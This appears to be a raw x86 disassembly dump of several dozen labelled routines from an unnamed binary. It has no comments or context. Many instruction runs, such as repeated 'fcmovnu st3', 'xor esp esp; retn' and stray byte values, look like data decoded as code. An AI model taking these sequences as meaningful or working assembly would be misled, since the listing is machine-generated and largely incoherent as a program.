add ebx [ esi + 0x24 ]
xor ch [ eax ]

sub_463615
fistp [ eax + 0x24 ]
fcmovbe st4
pop esi
das
0xdbdb
sub_463622
aam 0x5e
retn
sub_46374d
xor esp [ eax + 0x26 ]
and al 0x24
pop esi
sbb edx esp
pop edi
das
retn 0xdbdb
sub_4639bd
mov ebp 0xdbc6a132
fcmovnu st3
fcmovnbe st4
pop ecx
scasd [ edi ]
0xdbdb
sub_4639ef
mov ss [ eax + 0x37 ]
pop edx
aaa

sub_463b64
push eax
xchg [ ebx ] ah
aam 0x6c
sahf

sub_463bb0
adc bl [ eax ]
fcmovnu st3
fcmovnu st3
fisttp [ eax - 0x72cd7778 ]
int3
sub_4645bc
xor esp esp
retn
sub_46461f
mov bl 0x8
0x528c8d1d 0x775d
sub_464aa1
xor esp [ esp ]
fcmovnu st3
fcmovnu st3
push eax
or esi [ edx ]

sub_464c2d
mov bl 0xdb

sub_46522b
out dx eax
mov [ edx ] dh
0xdb242438 0xdbdb
sub_46541d
sbb esp [ esp ]
fcmovnu st3
aam 0x6c
0x3288
sub_465427
adc ebx [ ecx ]
and al 0x24
xor ecx [ edx + 0x58242407 ]
pop ds
iretd
sub_4654fb
fbstp [ edx ]
mov ch 0x3f
and al 0x24
fistp [ eax + 0x1f ]
retn
sub_466a2d
jmp sub_403834
sub_466a34
pop ebp
retn
j_sub_403834#2
jmp sub_403834
sub_466d00
pop ebp
retn
sub_466d46
retn
j_sub_403834
jmp sub_403834
j_sub_466d46
jmp sub_466d46
sub_466d4e
pop ebp
retn
sub_466fa5
0x45
sub_466fa8
pushfd
0x45
sub_466fac
insb
0x45
sub_466fb0
or al 0xcb
inc ebp
add ah bl
0x45
sub_466fb8
inc esp

